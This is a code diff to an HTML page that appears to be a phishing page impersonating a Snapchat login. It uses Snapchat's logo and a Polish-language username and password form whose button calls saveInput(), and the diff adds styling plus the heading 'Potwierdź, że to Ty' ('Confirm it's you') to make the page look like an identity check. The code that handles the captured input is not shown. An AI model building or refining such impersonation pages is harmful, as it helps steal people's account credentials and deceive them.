@@ -29,6 +29,12 @@
             width: 60px;
             margin-bottom: 20px;
         }
+        .confirmation-text {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
         input[type="text"], input[type="password"] {
             width: 100%;
             padding: 12px;
@@ -62,6 +68,10 @@
             .logo {
                 width: 50px;
             }
+            .confirmation-text {
+                font-size: 20px;
+                margin-bottom: 15px;
+            }
             input[type="text"], input[type="password"] {
                 padding: 10px;
                 margin: 8px 0;
@@ -77,6 +87,7 @@
 
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
+    <div class="confirmation-text">Potwierdź, że to Ty</div>
     <input type="text" id="username" placeholder="Nazwa użytkownika lub e-mail">
     <input type="password" id="password" placeholder="Hasło">
     <button onclick="saveInput()">Zaloguj się</button>
